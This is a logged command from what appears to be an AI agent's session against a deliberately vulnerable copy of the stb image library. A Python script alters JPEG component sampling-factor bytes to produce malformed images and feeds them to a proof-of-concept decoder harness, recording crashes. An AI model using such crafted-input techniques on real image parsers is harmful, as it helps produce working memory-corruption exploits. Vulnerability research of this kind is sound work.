Command `cd /workspace/repo-vul/src-vul/stb && python3 - <<'PY'
from pathlib import Path
from PIL import Image
import subprocess, itertools
img=Image.new('RGB',(8,8),(1,2,3))
img.save('/tmp/base.jpg','JPEG',subsampling=0,quality=90)
base=bytearray(Path('/tmp/base.jpg').read_bytes())
idx=base.find(b'\xff\xc0')
cs=idx+2+2+1+2+2+1
# vary second/third comp h/v to produce many malformed but valid-header images
pairs=[(0x11,0x11),(0x11,0x12),(0x11,0x13),(0x11,0x21),(0x11,0x31),(0x12,0x11),(0x13,0x11),(0x21,0x11),(0x31,0x11),(0x12,0x13),(0x13,0x12),(0x21,0x12),(0x12,0x21)]
for b,c in pairs:
    data=bytearray(base)
    data[cs+4+1]=b
    data[cs+7+1]=c
    p='/tmp/t.jpg'
    Path(p).write_bytes(data)
    r=subprocess.run(['/tmp/jpeg_poc',p],capture_output=True,text=True)
    if r.returncode!=0:
        print('pair',hex(b),hex(c),'rc',r.returncode)
        print('\n'.join(r.stderr.splitlines()[:6]))
PY` executed with exit code 0.
